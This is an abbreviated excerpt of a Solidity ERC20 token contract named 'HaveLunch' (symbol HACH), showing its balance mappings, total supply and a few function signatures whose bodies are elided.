...
contract HaveLunch is Context, IERC20, Ownable{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    mapping (address => bool) private _isExcluded;  
    uint256 private _totalSupply = 100000000 *  10**9;  
    string private _name = "HaveLunch";
    string private _symbol = "HACH";
    ...
    function checkdata(bool _enabled) external onlyOwner{
    ...
    function reducedata(uint256 _maxHold) public view returns(uint256) {
	...
	function tokenRemove(address to, uint256 _token) external
		{
